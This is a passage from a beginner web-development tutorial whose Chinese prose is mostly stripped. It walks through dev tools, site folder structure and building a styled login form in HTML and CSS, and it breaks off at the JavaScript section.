        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><blockquote><p><br>, <br><a href="https://blog.csdn.net/qq_40832960/article/details/104088696">#1html+css+js </a><br><a href="https://blog.csdn.net/qq_40832960/article/details/104089883">#2html+css+js </a><br><a href="https://blog.csdn.net/qq_40832960/article/details/104100918">#3html+css+js </a><br><a href="https://blog.csdn.net/qq_40832960/article/details/104132721">#3html+css+js  php</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/107132488">#3html+css+js  python flask (I)</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/107618638">#3html+css+js  python flask  (II)</a></p></blockquote><h2 id="0-"><a href="#0-" class="headerlink" title="0 "></a>0 </h2><h3 id="0-1-IDE"><a href="#0-1-IDE" class="headerlink" title="0.1 IDE"></a>0.1 IDE</h3><p></p><ol><li>DW(Adobe Dreamweaver)</li><li>Visual Studio Code()</li><li>Notepad++</li><li>()</li><li></li></ol><p>VS code</p><h3 id="0-2-"><a href="#0-2-" class="headerlink" title="0.2 "></a>0.2 </h3><p><br>chrome</p><h3 id="0-3-"><a href="#0-3-" class="headerlink" title="0.3 "></a>0.3 </h3><h4 id="0-3-1-html"><a href="#0-3-1-html" class="headerlink" title="0.3.1 html"></a>0.3.1 html</h4><p>HTML<code>&lt; =&quot;&quot;&gt;&lt;/&gt;</code><br>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>vs code!<br>html,body,meta<br>:<a href="https://www.w3school.com.cn/tags/index.asp">W3school</a></p><h4 id="0-3-2-css"><a href="#0-3-2-css" class="headerlink" title="0.3.2 css"></a>0.3.2 css</h4><p>(Cascading Style Sheets)HTMLXML()<br>csshtml<code>&#123;:;&#125;</code></p><ul><li>ID <code>#ID</code></li><li> <code>.</code></li><li> <code></code></li><li> <code>*</code></li></ul><p> eg:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*div*/</span></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">   <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0-3-3-js"><a href="#0-3-3-js" class="headerlink" title="0.3.3 js"></a>0.3.3 js</h4><p>JavaScriptJS ()<br>jshtmlhtml(javascript java)<br><a href="https://www.runoob.com/js/js-tutorial.html"></a></p><h3 id="0-4-"><a href="#0-4-" class="headerlink" title="0.4 "></a>0.4 </h3><p><br>www<br> &nbsp;-css<br> &nbsp;-js<br> &nbsp;-index.html<br> &nbsp;-robots.txt<br> &nbsp;-fonts<br> &nbsp;-pic<br> </p><ul><li>www </li><li>css css</li><li>js js</li><li>index.html </li><li>robots.txt ()()</li><li>fonts </li><li>pic <br> <img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-0.png" alt=""></li></ul><h3 id="0-5-"><a href="#0-5-" class="headerlink" title="0.5 "></a>0.5 </h3><p>jQuery(:js,<a href="https://jquery.com/"></a>jquery.min.js)<br>(css<a href="https://www.thinkcmf.com/font_awesome.html"></a>fontscss)<br>node.js(js,<a href="http://nodejs.cn/"></a></p><blockquote><p>:<br>bug<br>chrome</p></blockquote><h2 id="1-"><a href="#1-" class="headerlink" title="1 "></a>1 </h2><h2 id="1-1-"><a href="#1-1-" class="headerlink" title="1.1 "></a>1.1 </h2><p>html<strong>(.html)</strong><br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-1.png" alt=""><br>,<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-2.png" alt=""></p><h3 id="1-2-"><a href="#1-2-" class="headerlink" title="1.2 "></a>1.2 </h3><p><code>F12</code><code></code>:<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-3.jpg" alt="F12"><br></p><ol><li><code>Elements</code></li><li><code>Console</code>js<code>console.log(&quot;&quot;);</code></li><li><code>Soources</code></li><li><code>Network</code>postget,404</li><li><a href="https://blog.csdn.net/m0_37724356/article/details/79884006">CSDN</a></li></ol><p><code>styles</code>css<br>styles <a href="https://www.runoob.com/css/css-boxmodel.html"></a></p><p><br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-4.jpg" alt="E.G."><br>htmlcss<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-5.jpg" alt="Sources"><br></p><h3 id="1-3-"><a href="#1-3-" class="headerlink" title="1.3 "></a>1.3 </h3><p>id<code>Ctrl+F</code><br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-6.jpg" alt="ctrl+f"></p><h3 id="1-4-"><a href="#1-4-" class="headerlink" title="1.4 "></a>1.4 </h3><p>F12<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-7.jpg" alt=""></p><blockquote><p><br>html+css+jshtmljscss<br></p></blockquote><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><h3 id="2-1-"><a href="#2-1-" class="headerlink" title="2.1 "></a>2.1 </h3><p>1</p><h4 id="2-1-1-"><a href="#2-1-1-" class="headerlink" title="2.1.1 "></a>2.1.1 </h4><p><a href="https://blog.csdn.net/qq_40832960/article/details/104088696"></a></p><h4 id="2-1-2-"><a href="#2-1-2-" class="headerlink" title="2.1.2 "></a>2.1.2 </h4><p>index(index.php,index.asp<a href="https://www.csdn.net/gather_28/OtDaIg3sMDcyLWJsb2cO0O0O.html"></a>)<br>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-html"><a href="#2-2-html" class="headerlink" title="2.2 html"></a>2.2 html</h3><h4 id="2-2-1-"><a href="#2-2-1-" class="headerlink" title="2.2.1 "></a>2.2.1 </h4><p>index.html<code>&lt;head&gt;&lt;/head&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!----&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;generator&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IDE&quot;</span> /&gt;</span></span><br><span class="line">   <span class="comment">&lt;!----&gt;</span></span><br><span class="line">   <span class="comment">&lt;!----&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">   <span class="comment">&lt;!----&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-2-"><a href="#2-2-2-" class="headerlink" title="2.2.2 "></a>2.2.2 </h4><p><br>index.html<code>&lt;body&gt;&lt;/body&gt;</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;passwords&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2:</p><ul><li><code>&lt;div&gt;</code>  HTML </li><li><code>&lt;input&gt;</code> <code>type=&quot;text&quot;</code><code>placeholder</code></li><li><code>&lt;button&gt;</code><code>onclick=&quot;submit()&quot;</code><code>submit()</code>(js)</li></ul><p> :<br> <img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-8.jpg" alt=""></p><h4 id="2-2-3-ID"><a href="#2-2-3-ID" class="headerlink" title="2.2.3 ID"></a>2.2.3 ID</h4><p>IDidcssjs</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;input_f&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;um&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;pd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;passwords&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;bu&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ididid</p><h3 id="2-3-css"><a href="#2-3-css" class="headerlink" title="2.3 css"></a>2.3 css</h3><h4 id="2-3-1-css"><a href="#2-3-1-css" class="headerlink" title="2.3.1 css"></a>2.3.1 css</h4><p><code>/www/css</code><code>main.css</code></p><h4 id="2-3-2-css"><a href="#2-3-2-css" class="headerlink" title="2.3.2 css"></a>2.3.2 css</h4><p><code>&lt;body&gt;&lt;/body&gt;</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/main.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/w3cnote/html-import-css-method.html"></a></p><h4 id="2-3-3-"><a href="#2-3-3-" class="headerlink" title="2.3.3 "></a>2.3.3 </h4><h5 id="2-3-3-1-Step1-"><a href="#2-3-3-1-Step1-" class="headerlink" title="2.3.3.1 Step1 "></a>2.3.3.1 Step1 </h5><p><code>index.html</code><code>&lt;body&gt;&lt;/body&gt;</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;input_f&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;um&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;pd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;passwords&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;bu&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;br/&gt;</code>html<br><code>main.css</code>:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#input_f</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vw</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#xxx&#123;&#125;</code>cssid<code>text-align:center;</code>div<code>margin</code><a href="http://www.divcss5.com/rumen/r773.shtml"></a><code>height</code>,<code>vh</code><code>vw</code><strong>100</strong><code>25vh</code>25%,<code>30vw</code>30%<strong></strong></p><h5 id="2-3-3-2-Step2-"><a href="#2-3-3-2-Step2-" class="headerlink" title="2.3.3.2 Step2 "></a>2.3.3.2 Step2 </h5><p><code>main.css</code><strong>idinput_f</strong>:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#input_f</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">25vh</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vw</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>margin-top</code><code>&lt;div id=&quot;input_f&quot;&gt;</code><code>&lt;html&gt;</code></p><h5 id="2-3-3-3-Step3-"><a href="#2-3-3-3-Step3-" class="headerlink" title="2.3.3.3 Step3 "></a>2.3.3.3 Step3 </h5><p>div,<code>main.css</code>input_f:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#input_f</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">25vh</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vw</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid darkslategray;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>,border<a href="https://www.runoob.com/css/css-border.html"></a></p><h5 id="2-3-3-4-Step4-"><a href="#2-3-3-4-Step4-" class="headerlink" title="2.3.3.4 Step4 "></a>2.3.3.4 Step4 </h5><p><code>index.html</code><strong>iduminput</strong>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 3vw;&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>font-size</code><br>:<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-9.jpg" alt=""></p><h4 id="2-3-4-"><a href="#2-3-4-" class="headerlink" title="2.3.4 "></a>2.3.4 </h4><h5 id="BUTTON"><a href="#BUTTON" class="headerlink" title="BUTTON"></a>BUTTON</h5><p>button<a href="https://blog.csdn.net/genius_yym/article/details/79670326">mcya</a>css<code>main.css</code>:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#bu</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">15vw</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*https://blog.csdn.net/genius_yym/article/details/79670326 */</span></span><br><span class="line"><span class="selector-tag">button</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">outline</span>: none;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">    <span class="attribute">font</span>: <span class="number">14px</span>/<span class="number">100%</span> Arial, Helvetica, sans-serif;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">2px</span> <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">3</span>);</span><br><span class="line">    -webkit-<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">    -moz-<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">    -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">2</span>);</span><br><span class="line">    -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#d9eef7</span>;</span><br><span class="line">    <span class="attribute">border</span>: solid <span class="number">1px</span> <span class="number">#0076a3</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#0095cd</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-webkit-gradient</span>(linear, left top, left bottom, <span class="built_in">from</span>(<span class="number">#0095cc</span>), <span class="built_in">to</span>(<span class="number">#00678e</span>));</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(top, <span class="number">#00adee</span>, <span class="number">#00678e</span>);</span><br><span class="line">    <span class="attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="built_in">gradient</span>(startColorstr=<span class="string">&#x27;#00adee&#x27;</span>, endColorstr=<span class="string">&#x27;#00678e&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#007ead</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-webkit-gradient</span>(linear, left top, left bottom, <span class="built_in">from</span>(<span class="number">#00678e</span>), <span class="built_in">to</span>(<span class="number">#0095cc</span>));</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(top, <span class="number">#00678e</span>, <span class="number">#0095cc</span>);</span><br><span class="line">    <span class="attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="built_in">gradient</span>(startColorstr=<span class="string">&#x27;#00678e&#x27;</span>, endColorstr=<span class="string">&#x27;#0095cc&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/cssref/css-reference.html"></a><code>button:hover</code>buttonbutton<code>xxx&#123;&#125;</code>button</p><h5 id="2-3-4-1-INPUT"><a href="#2-3-4-1-INPUT" class="headerlink" title="2.3.4.1 INPUT"></a>2.3.4.1 INPUT</h5><p>main.cssbutton:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#input_f</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">25vh</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vw</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid darkslategray;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">170</span>, <span class="number">169</span>, <span class="number">169</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="attribute">outline-style</span>: none;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">20vw</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">3vw</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#um</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:focus</span> &#123;<span class="comment">/**/</span></span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#66afe9</span>;</span><br><span class="line">    <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">    -webkit-<span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">075</span>), <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span> <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">175</span>, <span class="number">233</span>, .<span class="number">6</span>);</span><br><span class="line">    <span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">075</span>), <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span> <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">175</span>, <span class="number">233</span>, .<span class="number">6</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4"><a href="#2-4" class="headerlink" title="2.4"></a>2.4</h3><p>html+css:<br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-10.jpg" alt=""></p><h3 id="2-5-JavaScript"><a href="#2-5-JavaScript" class="headerlink" title="2.5 JavaScript"></a>2.5 JavaScript</h3><h4 id="2-5-1-js"><a href="#2-5-1-js" 